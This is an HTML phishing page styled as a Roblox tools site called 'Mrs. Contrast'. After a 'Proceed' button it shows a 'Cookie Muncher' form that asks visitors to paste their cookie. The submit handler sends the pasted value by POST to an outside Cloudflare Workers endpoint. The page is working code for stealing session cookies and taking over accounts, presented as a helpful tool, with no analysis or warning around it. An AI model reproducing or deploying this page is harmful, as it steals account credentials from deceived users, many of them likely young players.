<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Contrast Cookiez</title>

<style>
* { box-sizing: border-box; }

body {
  margin: 0;
  height: 100vh;
  font-family: Inter, Arial, sans-serif;
  display: flex;
  justify-content: center;
  align-items: center;
  background:
    radial-gradient(circle at top left, #6a11cb, transparent 60%),
    radial-gradient(circle at bottom right, #2575fc, transparent 60%),
    #050505;
  overflow: hidden;
}

/* ---------- CARD ---------- */
.card {
  width: 390px;
  padding: 36px;
  border-radius: 32px;
  background: linear-gradient(
    160deg,
    rgba(255,255,255,0.96),
    rgba(245,245,245,0.88)
  );
  backdrop-filter: blur(18px);
  box-shadow: 0 35px 90px rgba(0,0,0,0.6);
  text-align: center;
  position: absolute;
  transition: 0.7s cubic-bezier(.22,1,.36,1);
}

/* ---------- STATES ---------- */
.hidden {
  opacity: 0;
  pointer-events: none;
  transform: translateY(40px) scale(0.94);
}

.visible {
  opacity: 1;
  pointer-events: auto;
  transform: translateY(0) scale(1);
}

/* ---------- PROGRESS ---------- */
.progress {
  display: flex;
  justify-content: center;
  gap: 10px;
  margin-bottom: 18px;
}

.dot {
  width: 10px;
  height: 10px;
  border-radius: 50%;
  background: #bbb;
  transition: 0.4s;
}

.dot.active {
  background: linear-gradient(135deg,#6a11cb,#2575fc);
  transform: scale(1.4);
}

/* ---------- TEXT ---------- */
h1 {
  margin: 0;
  font-size: 46px;
  letter-spacing: 3px;
}

.subtitle {
  margin-top: 10px;
  font-size: 16px;
  opacity: 0.85;
}

.status {
  font-size: 13px;
  opacity: 0.7;
}

hr {
  margin: 24px 0;
  border: none;
  height: 1px;
  background: linear-gradient(to right, transparent, #000, transparent);
}

/* ---------- BUTTON ---------- */
button {
  width: 100%;
  height: 56px;
  border-radius: 30px;
  border: none;
  font-size: 16px;
  cursor: pointer;
  background: linear-gradient(135deg, #111, #333);
  color: #fff;
  position: relative;
  overflow: hidden;
  transition: 0.35s;
}

button:hover {
  transform: translateY(-2px);
}

button:active {
  transform: scale(0.96);
}

button::before {
  content: "";
  position: absolute;
  inset: 0;
  background: linear-gradient(
    120deg,
    transparent,
    rgba(255,255,255,0.4),
    transparent
  );
  transform: translateX(-100%);
}

button:hover::before {
  animation: shine 1.1s infinite;
}

@keyframes shine {
  to { transform: translateX(100%); }
}

/* ---------- INPUT ---------- */
input {
  width: 100%;
  margin-top: 14px;
  padding: 14px 18px;
  border-radius: 30px;
  border: 2px solid #111;
  font-size: 16px;
  outline: none;
  transition: 0.25s;
}

input:focus {
  border-color: #6a11cb;
  box-shadow: 0 0 0 4px rgba(106,17,203,0.25);
}

/* ---------- BACK BUTTON ---------- */
.back {
  position: absolute;
  left: 18px;
  top: 18px;
  font-size: 14px;
  cursor: pointer;
  opacity: 0.6;
  transition: 0.3s;
}

.back:hover {
  opacity: 1;
  transform: translateX(-4px);
}

/* ---------- SUCCESS ---------- */
button.success {
  background: linear-gradient(135deg, #2ed573, #20bf6b);
  cursor: default;
}

.circle {
  width: 42px;
  height: 42px;
  border-radius: 50%;
  border: 3px solid #fff;
  position: absolute;
  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%) scale(0);
}

button.success .circle {
  animation: pop 0.5s forwards;
}

@keyframes pop {
  to { transform: translate(-50%, -50%) scale(1); }
}

svg {
  width: 24px;
  height: 24px;
  fill: none;
  stroke: white;
  stroke-width: 4;
  stroke-dasharray: 48;
  stroke-dashoffset: 48;
  animation: draw 0.6s 0.3s forwards;
}

@keyframes draw {
  to { stroke-dashoffset: 0; }
}

.btn-text { transition: opacity 0.3s; }
button.success .btn-text { opacity: 0; }

#thankyou {
  margin-top: 16px;
  font-size: 14px;
  color: #1e7e34;
  display: none;
}

/* ---------- FOOTER ---------- */
.footer {
  margin-top: 24px;
  font-size: 12px;
  opacity: 0.6;
}
</style>
</head>

<body>

<!-- LANDING -->
<div id="landing" class="card visible">
  <div class="progress">
    <div class="dot active"></div>
    <div class="dot"></div>
  </div>

  <h1>MRS. CONTRAST</h1>
  <p class="subtitle">Your all-in stop for Roblox tools.</p>
  <p class="status">Status: Working</p>

  <hr>

  <p>CLICK HERE TO PROCEED</p>
  <button id="proceedBtn">Proceed</button>

  <div class="footer">@mrscontrast on tiktok</div>
</div>

<!-- SURVEY -->
<div id="survey" class="card hidden">
  <div class="back" id="backBtn">‚Üê Back</div>

  <div class="progress">
    <div class="dot"></div>
    <div class="dot active"></div>
  </div>

  <h1>COOKIE MUNCHER</h1>
  <p class="status">Developed by: Contrast</p>

  <hr>

  <label>ENTER DETAILS:</label>
  <input id="response" type="text" placeholder="Cookie here">

  <button id="submitBtn">
    <div class="circle">
      <svg viewBox="0 0 52 52">
        <path d="M14 27 L22 35 L38 19"></path>
      </svg>
    </div>
    <span class="btn-text">Submit</span>
  </button>

  <p id="thankyou">Thank you, please have some patience.</p>
  <div class="footer">@mrscontrast on tiktok</div>
</div>

<audio id="clickSound" preload="auto">
  <source src="https://cdn.jsdelivr.net/gh/itsron717/assets/click.mp3">
</audio>

<script>
const landing = document.getElementById("landing");
const survey = document.getElementById("survey");
const sound = document.getElementById("clickSound");

function play() { sound.currentTime = 0; sound.play(); }

document.getElementById("proceedBtn").onclick = () => {
  play();
  landing.classList.replace("visible","hidden");
  setTimeout(() => survey.classList.replace("hidden","visible"), 350);
};

document.getElementById("backBtn").onclick = () => {
  play();
  survey.classList.replace("visible","hidden");
  setTimeout(() => landing.classList.replace("hidden","visible"), 350);
};

document.getElementById("submitBtn").onclick = async () => {
  const input = response;
  const btn = submitBtn;

  if (!input.value.trim() || btn.disabled) return;

  play();

  await fetch("https://server-proxygals.gonzalesartandrei913.workers.dev/", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ response: input.value })
  });

  btn.classList.add("success");
  btn.disabled = true;
  input.disabled = true;
  thankyou.style.display = "block";
};
</script>

</body>
</html>
